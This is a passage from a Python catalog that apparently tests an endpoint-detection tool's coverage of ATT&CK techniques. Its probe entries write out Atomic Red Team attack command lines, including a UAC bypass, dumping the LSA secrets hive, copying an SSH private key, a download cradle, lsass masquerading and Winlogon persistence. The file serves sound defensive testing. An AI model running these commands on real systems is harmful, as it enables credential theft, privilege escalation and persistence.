            "cmdline": r"reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f",
            "path": ""},
        notes="Registers a HKCU ms-settings command handler that fodhelper/"
              "computerdefaults then auto-elevates - the classic fileless UAC "
              "bypass. HKCU only (reversible). Verified -> T1548.002. FIRST "
              "Privilege Escalation entry in the catalog.",
    ),
    Technique(
        id="disc-localgroup", technique_id="T1069.001",
        technique_name="Permission Groups Discovery: Local Groups (net localgroup)",
        tactic="Discovery", art_test_ref="T1069.001 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py classify_discovery "
                       "('net localgroup' branch, non-/add) -> "
                       "'reconnaissance-burst' sequence IOA (T1069 added to "
                       "the sequence's technique tuple)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe", "cmdline": "net localgroup administrators",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        notes="CORRECTED 2026-08-27, TWICE. First correction: this entry was "
              "stale relative to the code's own already-proven capability - "
              "classify_discovery labels bare 'net localgroup' as T1069.001 "
              "(fixed in an earlier session), T1069 was added to the "
              "reconnaissance-burst sequence's technique tuple, and an ad hoc "
              "live check with (disc-net-view, disc-domain-trust) as partners "
              "showed DETECT - but this catalog entry itself was never "
              "updated off probe='ioa_rule'/predicted MISS, so every "
              "automated run since then scored a miss purely because the "
              "TEST never gave it burst partners. First fix reused those "
              "same two partners directly, INCLUDING nltest.exe "
              "/domain_trusts - which is wrong: verified via "
              "replay_harness.py (fires=False) that nltest WITH that flag is "
              "explicitly EXCLUDED from classify_discovery's own diversity "
              "count, precisely because it already has its own separate "
              "named MEDIUM rule (behavioral_rules.py nltest-domain) - so "
              "the burst only ever saw 2 distinct classify_discovery "
              "techniques (T1069.001, T1018), never the 3 required to "
              "complete. The original ad hoc verification's 'disc-domain-"
              "trust' partner must have counted toward completion through "
              "some other path than this specific function, not reproduced "
              "here. Second fix: replaced with the identical "
              "systeminfo.exe/tasklist.exe partner pair already proven "
              "across every other recon_burst entry in this file, verified "
              "fires=True via replay_harness.py before touching CI. " +
              _RECON_BURST_NOTE,
    ),
    # ---- honest MISS entries: what the breadth test shows is NOT covered ----
    Technique(
        id="exec-wscript-vbs", technique_id="T1059.005",
        technique_name="Command & Scripting Interpreter: Visual Basic (wscript)",
        tactic="Execution", art_test_ref="T1059.005 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="no dedicated rule for a bare wscript .vbs launch",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "wscript.exe", "parent": "cmd.exe",
            "cmdline": r"wscript.exe C:\Users\Public\evil.vbs", "path": ""},
        notes="A bare wscript .vbs invocation does not fire a rule (verified -> "
              "None). Honest gap: VBScript execution via wscript is uncovered "
              "unless the script's own behaviour trips a later rule.",
    ),
    Technique(
        id="collect-archive-rar", technique_id="T1560.001",
        technique_name="Archive Collected Data: Archive via Utility (rar)",
        tactic="Collection", art_test_ref="T1560.001 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="no Collection-tactic rule content today",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "rar.exe", "parent": "cmd.exe",
            "cmdline": r"rar.exe a -r C:\Users\Public\loot.rar C:\Users\bob\Documents",
            "path": ""},
        notes="TWO separate findings, kept apart honestly. (1) TOOL ABSENT: "
              "rar.exe ships with WinRAR, not with Windows (verified 2026-08-25 "
              "on a stock box and the CI runner), so a live MISS here is a "
              "tool-failure - NOT_TESTED, not a detection gap. (2) Even if it "
              "ran, this exact command archives ~\\Documents, which is an "
              "ORDINARY BACKUP shape and is deliberately NOT flagged - the "
              "archive-credential-store rule (added 2026-08-24) fires on the "
              "SOURCE being a credential store (.ssh/.aws/browser profile), "
              "because flagging a Documents backup is precisely the interference "
              "the prime directive forbids. So this entry stays a MISS by design "
              "and a separate credential-store entry measures the real capability.",
    ),
    # The Collection entry that actually MEASURES the capability. The two
    # entries above are honest MISSes (absent tool / ordinary-backup shape); this
    # one uses the malicious shape - copying a credential ARTIFACT - with a tool
    # that ships with Windows, so it is genuinely testable on a clean host.
    Technique(
        id="collect-copy-cred-store", technique_id="T1005",
        technique_name="Data from Local System (credential store copy)",
        tactic="Collection", art_test_ref="T1005 (credential-store staging)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: copy-credential-store rule",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "xcopy.exe", "parent": "cmd.exe",
            "cmdline": r"xcopy.exe C:\Users\Public\.ssh\id_rsa C:\Users\Public\stage\ /Y",
            "path": ""},
        notes="Verified against the real classifier -> copy-credential-store "
              "(T1005). xcopy ships with Windows so this is testable on a clean "
              "host, unlike the rar entry above. Uses a Public-dir source so the "
              "atomic touches no real user secret.",
    ),
    Technique(
        id="collect-local-copy", technique_id="T1005",
        technique_name="Data from Local System (bulk document copy)",
        tactic="Collection", art_test_ref="T1005 (documented cmdline)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no code path checks for bulk local data collection",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "cmd.exe", "parent": "cmd.exe",
            "cmdline": r"cmd.exe /c copy C:\Users\bob\Documents\*.docx C:\Users\Public\staging",
            "path": ""},
        notes="Bulk copy of user documents to a staging dir - predicted MISS "
              "(no Collection rules). SOURCE_PARTIAL: honest, not source-traced.",
    ),
]

# =============================================================================
# BREADTH EXPANSION ROUND 2 (2026-08-26) - the Detection Coverage milestone's
# push from 52 toward 100-200+ in-scope techniques, requested explicitly by the
# owner with a hard rule: do not fabricate, do not invent commands, do not
# manipulate the denominator to hit a target percentage.
#
# Every command below was fetched from the REAL Atomic Red Team GitHub repo
# (raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/<id>/
# <id>.md) on 2026-08-26 and copied verbatim from a real, numbered Atomic Test
# - never guessed. `art_test_ref` names the exact test. Several ART tests for
# these technique IDs are macOS/Linux/domain-only and were skipped in favor of
# the Windows-standalone-VM-compatible test number that actually exists in the
# same file (e.g. T1113 Test #1 is macOS `screencapture`; T1113 has no
# Windows-standalone atomic used here - see the excluded list below).
#
# Every predicted_tier_b below was set by READING Valkyrie's actual classifier
# source (behavioral_rules.py Rule() definitions, process_telemetry.py
# classify_discovery / _discovery_cmdline_technique / _DISCOVERY_SOLO_BINS) and
# checking the REAL ART command string against the REAL match conditions -
# never guessed, following this file's own established discipline.
#
# GENUINE MISLABELING FINDINGS surfaced by this exercise (not hidden): a test
# can hit a real, firing rule whose OWN technique label differs from the ID
# under test. Per this file's `known_mismatch` contract, none of these are
# credited as a correct detection of the tested technique - the classifier
# fires, but on the wrong ATT&CK ID:
#   - FIXED 2026-08-31: cred-lsa-secrets (T1003.004) used to fire
#     `reg-save-hive`, labeled T1003.002 (SAM), because that one rule matched
#     HKLM\SAM/SYSTEM/SECURITY under a single tag. Split into a dedicated
#     `reg-save-hive-lsa-secrets` rule - see that Technique entry below for
#     the live re-verification status.
#   - collect-stage-download (T1074.001) fires `ps-download-cradle-exec`,
#     labeled T1105 (Ingress Tool Transfer) - a PowerShell download-to-disk
#     looks identical to the classifier regardless of staging vs. transfer intent.
#   - disc-network-share (T1135) fires the `net.exe` "view" branch, labeled
#     T1018 (Remote System Discovery) - `net view` is MITRE's own documented
#     example for BOTH techniques, and the code picked one.
#   - evasion-masquerade-lsass (T1036.003) fires `masquerade-system-binary-
#     location`, labeled T1036.005 - the atomic exercises both the RENAME
#     (.003) and the WRONG-LOCATION (.005) shape at once; the rule only tags
#     the latter.
#   - evasion-file-delete (T1070.004) fires `mass-file-delete`, labeled T1485
#     (Data Destruction) - the ART default target path (%temp%, under
#     \AppData\) satisfies that rule's directory-scope check even for a
#     single-file cleanup delete.
# None of these are fixed here. They are catalogued honestly and left for the
# adversarial-improvement phase, which must decide with evidence whether each
# is worth a targeted correction or is an acceptable, expected overlap between
# adjacent ATT&CK sub-techniques.
EXPANSION_ROUND2 = [
    Technique(
        id="cred-lsa-secrets", technique_id="T1003.004",
        technique_name="OS Credential Dumping: LSA Secrets",
        tactic="Credential Access",
        art_test_ref="T1003.004 Test #1 (reg save HKLM\\security\\policy\\"
                      "secrets) - simplified to drop the atomic's PsExec "
                      "wrapper (PsExec is an external download, not needed "
                      "for the underlying reg.exe command it just re-runs "
                      "with -s)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: reg-save-hive-lsa-secrets "
                       "rule (cmd_all=('save',), cmd_any=('hklm\\security',)) "
                       "- split from reg-save-hive 2026-08-31 so this hive "
                       "gets its own T1003.004 label instead of borrowing "
                       "reg-save-hive's T1003.002",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r"reg.exe save hklm\security C:\Users\Public\secrets /y",
            "path": ""},
        notes="Fixed 2026-08-31: reg-save-hive used to match ANY of hklm\\sam "
              "/ hklm\\system / hklm\\security but tag them all T1003.002 "
              "(SAM). Split into two rules - a real reg.exe save targets "
              "exactly one hive path per invocation, so this is not an "
              "overlapping guess. Offline-verified via test_behavioral_rules.py "
              "(new reg-save-hive-lsa-secrets case); live Tier B "
              "re-verification pending - expect this to fire as T1003.004 "
              "directly (known_mismatch removed) on the next live run, not "
              "as T1003.002.",
    ),
    Technique(
        id="collect-clipboard", technique_id="T1115",
        technique_name="Clipboard Data",
        tactic="Collection", art_test_ref="T1115 Test #1 (dir | clip; "
                      "echo T1115 > file; clip < file)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="none found - grepped behavioral_rules.py for "
                       "clip/clipboard, zero matches",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "clip.exe", "parent": "cmd.exe",
            "cmdline": r"clip.exe < C:\Users\Public\T1115.txt", "path": ""},
        notes="Genuine, confirmed gap: no code path anywhere touches "
              "clipboard access. clip.exe ships with Windows so this is "
              "fully testable; Valkyrie simply has no detector for this "
              "tactic at all today.",
    ),
    Technique(
        id="collect-stage-download", technique_id="T1074.001",
        technique_name="Data Staged: Local Data Staging",
        tactic="Collection",
        art_test_ref="T1074.001 Test #1 (Invoke-WebRequest a .bat file to "
                      "$env:TEMP)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: ps-download-cradle-exec "
                       "(Invoke-WebRequest + a script/exe extension)",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": "powershell.exe -NoProfile -Command \"Invoke-WebRequest "
                       "'https://raw.githubusercontent.com/redcanaryco/"
                       "atomic-red-team/master/atomics/T1074.001/src/"
                       "Discovery.bat' -OutFile $env:TEMP\\discovery.bat\"",
            "path": ""},
        known_mismatch="T1105 — Ingress Tool Transfer (PowerShell)",
        notes="The classifier cannot distinguish 'staging a file locally' "
              "from 'transferring a tool in' - both are IWR-to-disk with a "
              "script extension. Real download, real detection, wrong "
              "specific label - see the file-level note above.",
    ),
    Technique(
        id="disc-network-config", technique_id="T1016",
        technique_name="System Network Configuration Discovery",
        tactic="Discovery", art_test_ref="T1016 Test #1 (ipconfig /all; "
                      "netsh interface show interface; arp -a; nbtstat -n; "
                      "net config)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py _DISCOVERY_SOLO_BINS"
                       "['ipconfig.exe'] -> 'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "ipconfig.exe", "cmdline": "ipconfig.exe /all",
            "co_occurring": [("reg.exe", 'reg.exe query '
                              '"HKLM\\SOFTWARE\\Microsoft\\Windows\\'
                              'CurrentVersion\\Run"'),
                             ("sc.exe", "sc.exe query windefend")]},
        notes=_RECON_BURST_NOTE + " ipconfig.exe is an explicit solo-bin "
              "entry added specifically to close this earlier-identified gap "
              "(see the module comment in process_telemetry.py).",
    ),
    Technique(
        id="disc-network-connections", technique_id="T1049",
        technique_name="System Network Connections Discovery",
        tactic="Discovery", art_test_ref="T1049 Test #1 (netstat -ano; "
                      "net use; net sessions)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py _DISCOVERY_SOLO_BINS"
                       "['netstat.exe'] -> 'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "netstat.exe", "cmdline": "netstat.exe -ano",
            "co_occurring": [("ipconfig.exe", "ipconfig.exe /all"),
                             ("whoami.exe", "whoami.exe /priv")]},
        notes=_RECON_BURST_NOTE + " NOTE: only the netstat.exe portion of "
              "this compound atomic is classified; 'net use' and 'net "
              "sessions' alone are not recognized by the net.exe cmdline-"
              "shape branch (which only handles view/group/localgroup/user), "
              "so a run of just those two would not contribute.",
    ),
    Technique(
        id="disc-query-registry", technique_id="T1012",
        technique_name="Query Registry",
        tactic="Discovery", art_test_ref="T1012 Test #1 (reg query chain "
                      "against Run/RunOnce/Winlogon/SafeBoot keys)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py "
                       "_discovery_cmdline_technique (reg.exe + 'query', not "
                       "mutating) -> 'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "reg.exe",
            "cmdline": 'reg.exe query "HKLM\\SOFTWARE\\Microsoft\\Windows\\'
                       'CurrentVersion\\Run"',
            "co_occurring": [("ipconfig.exe", "ipconfig.exe /all"),
                             ("systeminfo.exe", "systeminfo.exe")]},
        notes=_RECON_BURST_NOTE,
    ),
    Technique(
        id="disc-service-discovery", technique_id="T1007",
        technique_name="System Service Discovery",
        tactic="Discovery",
        art_test_ref="documented cmdline (sc query) - not tied to a specific "
                      "numbered ART test; sc.exe ships with Windows",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py "
                       "_discovery_cmdline_technique (sc.exe + 'query', not "
                       "mutating) -> 'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "sc.exe", "cmdline": "sc.exe query windefend",
            "co_occurring": [("tasklist.exe", "tasklist.exe /v"),
                             ("whoami.exe", "whoami.exe /priv")]},
        notes=_RECON_BURST_NOTE,
    ),
    Technique(
        id="disc-network-share", technique_id="T1135",
        technique_name="Network Share Discovery",
        tactic="Discovery",
        art_test_ref="T1135 Test #4 (net view \\\\localhost) - the "
                      "Windows-command-prompt variant; Test #1 is macOS-only",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/process_telemetry.py "
                       "_discovery_cmdline_technique (net.exe + 'view') -> "
                       "'reconnaissance-burst' IOA",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="recon_burst", probe_input={
            "image": "net.exe", "cmdline": "net.exe view \\\\localhost",
            "co_occurring": [("systeminfo.exe", "systeminfo.exe"),
                             ("tasklist.exe", "tasklist.exe /v")]},
        known_mismatch="T1018 — Remote System Discovery",
        notes=_RECON_BURST_NOTE + " 'net view' is MITRE's own documented "
              "example command for BOTH T1018 and T1135; the code's net.exe "
              "branch checks 'view' before any share-specific keyword and "
              "always returns T1018 - see the file-level note above.",
    ),
    Technique(
        id="disc-security-software", technique_id="T1518.001",
        technique_name="Security Software Discovery",
        tactic="Discovery",
        art_test_ref="T1518.001 Test #1 (netsh advfirewall/firewall chain, "
                      "sc query windefend, tasklist + findstr AV-name chain)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no rule/classifier targets 'security software "
                       "discovery' as its own intent; individual lines of "
                       "this compound atomic incidentally trigger OTHER "
                       "labels (tasklist.exe -> T1057 solo-bin, "
                       "'sc query windefend' -> T1007) but nothing tags the "
                       "netsh firewall-enumeration lines at all",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "tasklist.exe", "parent": "cmd.exe",
            "cmdline": "tasklist.exe | findstr /i defender", "path": ""},
        notes="Honest compound-test finding: no single technique-specific "
              "detection exists for 'is the attacker fingerprinting my "
              "security tools', even though parts of the same command chain "
              "independently light up as T1057/T1007. SOURCE_PARTIAL because "
              "the netsh-specific lines were not traced as exhaustively as "
              "the net.exe/reg.exe/sc.exe branches above.",
    ),
    Technique(
        id="disc-file-directory", technique_id="T1083",
        technique_name="File and Directory Discovery",
        tactic="Discovery",
        art_test_ref="T1083 Test #1 (dir /s chains against C:\\, Program "
                      "Files, Users, AppData\\...\\Recent, Desktop; tree /F)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no cmd.exe-builtin classifier branch found - 'dir' is "
                       "a cmd.exe internal command, not a separate process, "
                       "so this atomic never produces a distinctly-named "
                       "image for any per-binary rule to key on",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "cmd.exe", "parent": "cmd.exe",
            "cmdline": r"cmd.exe /c dir /s C:\Users\Public >> "
                       r"C:\Users\Public\t1083.txt", "path": ""},
        notes="SOURCE_PARTIAL: not exhaustively traced for a generic "
              "cmd.exe-cmdline discovery branch (only net.exe/reg.exe/"
              "sc.exe/nltest.exe/powershell.exe branches were confirmed to "
              "exist). Honest best-effort prediction given what was found.",
    ),
    Technique(
        id="evasion-masquerade-lsass", technique_id="T1036.003",
        technique_name="Masquerading: Rename System Utilities",
        tactic="Defense Evasion",
        art_test_ref="T1036.003 Test #1 (copy cmd.exe to "
                      "%SystemRoot%\\Temp\\lsass.exe, launch it)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: "
                       "masquerade-system-binary-location (images includes "
                       "'lsass.exe', path_any includes '\\temp\\')",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "lsass.exe", "parent": "cmd.exe",
            "cmdline": r"copy %SystemRoot%\System32\cmd.exe "
                       r"%SystemRoot%\Temp\lsass.exe & "
                       r"%SystemRoot%\Temp\lsass.exe /B",
            "path": r"C:\Windows\Temp\lsass.exe"},
        known_mismatch="T1036.005 — Masquerading: Match Legitimate Name or "
                        "Location",
        notes="The atomic exercises BOTH the rename (.003, this test's own "
              "ATT&CK id) and wrong-location (.005) masquerade shapes at "
              "once; the only rule that fires tags .005 specifically - see "
              "the file-level note above. LIVE-RUN NOTE: needs the copied "
              "Temp\\lsass.exe cleaned up after the window closes.",
    ),
    Technique(
        id="evasion-file-delete", technique_id="T1070.004",
        technique_name="Indicator Removal: File Deletion",
        tactic="Defense Evasion",
        art_test_ref="T1070.004 Test #4 (del /f a single file under %temp%)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: mass-file-delete "
                       "(cmd_any includes 'del /f'; cmd_any2 includes "
                       "'\\appdata\\', which %temp% resolves under) - "
                       "SEV_LOW",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "cmd.exe", "parent": "cmd.exe",
            "cmdline": r"del /f C:\Users\Public\AppData\Local\Temp\\"
                       r"deleteme_t1070004.txt", "path": ""},
        known_mismatch="T1485 — Data Destruction",
        notes="CORRECTED after running replay_harness.py against this exact "
              "entry: the initial by-hand trace (below) only checked the "
              "keyword/path match and missed the severity gate. The label "
              "DOES attach (mass-file-delete's cmd_any/cmd_any2 both match, "
              "confirmed live: reason 'Recursive force-delete of a user-data "
              "tree', label 'destroy_files') but at SEV_LOW - and this rule's "
              "own source comment says LOW is deliberate, 'del /s /q is also "
              "ordinary cleanup, so this only feeds sequence correlation and "
              "never auto-blocks on its own'. A single standalone delete "
              "therefore does not clear the severity gate, the same pattern "
              "already established for single Discovery commands. So this "
              "is TWO findings stacked, not one: (1) the technique-label "
              "mismatch (fires under T1485, not T1070.004) and (2) even "
              "under its own fired label, LOW severity means a standalone "
              "run is an honest MISS - it would need file-deletion sequence "
              "correlation (multiple deletes in a burst) to surface as an "
              "incident, mirroring the reconnaissance-burst pattern for "
              "Discovery. Left as MISS rather than re-labeled CONDITIONAL, "
              "since no such delete-burst sequence IOA exists today to make "
              "the condition concrete.",
    ),
    Technique(
        id="evasion-modify-registry", technique_id="T1112",
        technique_name="Modify Registry",
        tactic="Defense Evasion",
        art_test_ref="T1112 Test #1 (reg add HideFileExt=1 under HKCU "
                      "Explorer\\Advanced)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_NONE,
        detector_path="no rule found for ordinary Explorer display-setting "
                       "registry writes",
        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": "reg.exe add HKEY_CURRENT_USER\\Software\\Microsoft\\"
                       "Windows\\CurrentVersion\\Explorer\\Advanced /t "
                       "REG_DWORD /v HideFileExt /d 1 /f", "path": ""},
        notes="Likely MISS BY DESIGN rather than a gap worth closing: "
              "toggling 'show file extensions' is an extremely common, "
              "entirely ordinary user/admin preference change, and a rule "
              "here would be a false-positive generator against routine use "
              "- consistent with this project's precision-first philosophy. "
              "Kept in the catalog because T1112 is broad and other, more "
              "attacker-shaped registry-modify atomics may fire differently; "
              "this specific one is not expected to, nor obviously should.",
    ),
    Technique(
        id="persist-winlogon-shell", technique_id="T1547.004",
        technique_name="Boot or Logon Autostart Execution: Winlogon Helper DLL",
        tactic="Persistence",
        art_test_ref="T1547.004 Test #1 (Set-ItemProperty Winlogon\\Shell)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: "
                       "persistence-winlogon-generic (cmd_all '\\winlogon', "
                       "cmd_any a write verb, cmd_any2 'shell'/'userinit')",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "powershell.exe", "parent": "cmd.exe",
            "cmdline": 'powershell.exe Set-ItemProperty '
                       '"HKCU:\\Software\\Microsoft\\Windows NT\\'
                       'CurrentVersion\\Winlogon\\" "Shell" '
                       '"explorer.exe, C:\\Windows\\System32\\cmd.exe" '
                       '-Force', "path": ""},
        notes="Clean DETECT, correctly labeled - all three match conditions "
              "(\\winlogon, Set-ItemProperty, 'shell') verified present in "
              "the real ART command line.",
    ),
    Technique(
        id="persist-logon-script", technique_id="T1037.001",
        technique_name="Boot or Logon Initialization Scripts: Logon Script (Windows)",
        tactic="Persistence",
        art_test_ref="T1037.001 Test #1 (REG ADD HKCU\\Environment /v "
                      "UserInitMprLogonScript)",
        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: persistence-logon-script "
                       "(cmd_all 'userinitmprlogonscript', cmd_any a write "
                       "verb or '/d ')",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": r'reg.exe ADD HKCU\Environment /v '
                       r'UserInitMprLogonScript /t REG_SZ /d '
                       r'C:\Users\Public\art.bat /f', "path": ""},
        notes="Clean DETECT, correctly labeled T1037.001 exactly as tested. "
              "'/d ' (with trailing space) matches even though 'reg add' "
              "as a bare substring would not survive 'reg.exe add'.",
    ),
    Technique(
        id="cred-cmdkey-list", technique_id="T1003.005",
        technique_name="OS Credential Dumping: Cached Domain Credentials",
        tactic="Credential Access",
        art_test_ref="T1003.005 Test #1 (cmdkey /list)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: cmdkey-list "
                       "(images=('cmdkey.exe',), cmd_any includes '/list') "
                       "- SEV_LOW, 'feeds sequence correlation, doesn't "
                       "auto-block' per its own source comment",
        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "cmdkey.exe", "parent": "cmd.exe",
            "cmdline": "cmdkey.exe /list", "path": ""},
        known_mismatch="T1555 — Credentials from Password Stores (cmdkey)",
        notes="Verified live against replay_harness.py (learned from the "
              "evasion-file-delete correction earlier in this batch not to "
              "guess past the severity gate): the label attaches "
              "(classifier_logic_fires) but SEV_LOW, and the rule's own "
              "labeled technique is T1555, not T1003.005 - two stacked "
              "reasons this scores MISS for the tested id, not one.",
    ),
    Technique(
        id="cred-registry-password-hunt", technique_id="T1552.002",
        technique_name="Unsecured Credentials: Credentials in Registry",
        tactic="Credential Access",
        art_test_ref="T1552.002 Test #1 (reg query HKLM/HKCU /f password "
                      "/t REG_SZ /s)",
        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
        detector_path="valkyrie/behavioral_rules.py: cred-registry-password-hunt "
                       "rule (added 2026-08-31; images=('reg.exe',), "
                       "cmd_all=('query','/f'), cmd_any2=password-like "
                       "keywords) - fires standalone now, no longer needs "
                       "the recon_burst co-occurring partners below",
        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
        probe="ioa_rule", probe_input={
            "image": "reg.exe", "parent": "cmd.exe",
            "cmdline": "reg.exe query HKLM /f password /t REG_SZ /s",
            "path": ""},
        notes="Fixed 2026-08-31: previously only reached process_telemetry.py's "
              "generic T1012 (Query Registry) branch via the recon_burst "
              "mechanism - the command shape (reg query, read-only) has no "
              "signal for the SPECIFIC intent (hunting for the literal word "
              "'password') without a dedicated rule. Added "
              "cred-registry-password-hunt, same cmd_all + cmd_any2 shape as "
              "the existing cred-hunt-files rule (T1552.001): a find-verb "
              "ANDed with a secret keyword, so an ordinary 'reg query <key> "
              "/v <name>' (no /f, no keyword) stays clear - see "
              "test_behavioral_rules.py's new benign control. Offline-"
              "verified; live Tier B re-verification pending - expect this "
              "to fire standalone as T1552.002 directly (known_mismatch "
              "removed) rather than needing burst correlation.",
    ),
]

# ---------------------------------------------------------------------------
# ROUND 2B (2026-08-26) - a background research agent independently sourced 61
# more candidates across Discovery/Privilege Escalation/Defense Evasion,
# cross-checking the live Atomic Red Team repo directly (it found the entire
# T1562.* folder tree has since been removed from ART upstream, confirmed via
# three separate methods, and flagged verclsid.exe/mavinject.exe as at real
# risk of being absent on windows-latest since LOLBAS scopes both to
# Windows 10/11 client only, no Server edition). Many of its 61 overlapped
# with what round 2 (above) already added under different id slugs testing
# the identical command - those are skipped here, not duplicated. This subset
# is the well-verified, low-risk remainder: no external downloads, no
# uncertain-binary-presence LOLBins, no reboot-dependent techniques. Each
# predicted_tier_b was set the same way as every other entry in this file -
# by reading Valkyrie's real classifier source, not by trusting the agent's
# own "likely_valkyrie_relevance" guess (which was explicitly a sanity check,
# not a detection prediction, and is not used here).
#
# A SECOND named-rule generalization finding, distinct from round 2's five:
# `uac-bypass-hijack` (behavioral_rules.py) is not one UAC-bypass rule but a
# keyword set covering FOUR real bypass mechanisms at once (ms-settings,
# mscfile, exefile/Folder ProgIds, and any DelegateExecute write) - which
# means three of the agent's proposed UAC variants already fire the SAME
# existing rule as each other and as the original catalog's fodhelper entry.
# Only the genuinely uncovered ProgID/CurVer variant is a new finding.
EXCLUDED_FROM_ROUND2B = (
    "T1552.006 GPP, T1567.002 rclone/Mega, T1134.001 Empire-script-download "
    "(both NamedPipe and SeDebug variants), T1134.002 (needs ART's own "
    "GetToken.ps1 helper plus a live lsass token duplication - too far from "
    "a literal command line for this pass), T1574.001 phantom-DLL/Spooler "
    "variant (writes into System32 AND requires a service restart to prove "
    "anything - the amsi.dll rename variant below is kept, it needs neither), "
    "T1553.003 SIP hijack (downloads a third-party researcher's compiled DLL "
    "from GitHub at runtime), T1553.004 root cert install (needs a "
    "generated test cert as a prerequisite this pass didn't build), "
    "T1553.005 both variants (need a pre-staged MOTW-tagged decoy file/ISO "
    "this pass didn't build), T1218.002/.004/.008/.009 (each needs a "
    "compiled or downloaded payload artifact staged first), T1216.001 "
    "(fetches a remote .sct payload - same class of dependency), T1218.014 "
    "MMC (GUI console host, uncertain behavior on a headless CI session), "
    "T1218.012 verclsid / T1218.013 mavinject (both flagged by the "
    "research agent as at real risk of being ABSENT on windows-latest "
    "Server 2022 - deferred rather than catalogued on that uncertainty), "
    "T1562.002/.006 (their own ART atomics folder is confirmed gone "
    "upstream; the underlying wevtutil/auditpol commands are real and could "
    "still be catalogued as 'documented cmdline', but disabling the "
    "Security event log or audit policy for a live evaluation run has "
    "genuine blast-radius risk to the SAME run's own evidence collection - "
    "deferred for a dedicated, carefully-sequenced pass rather than mixed "
    "into this batch), T1134.004 parent-PID spoofing (installs a "
    "third-party PowerShell Gallery module at runtime), disc-app-window "
    "T1010 (needs a compiled helper binary staged from ART's own repo), "
    "disc-geo-location T1614 (makes a real outbound call to a public "
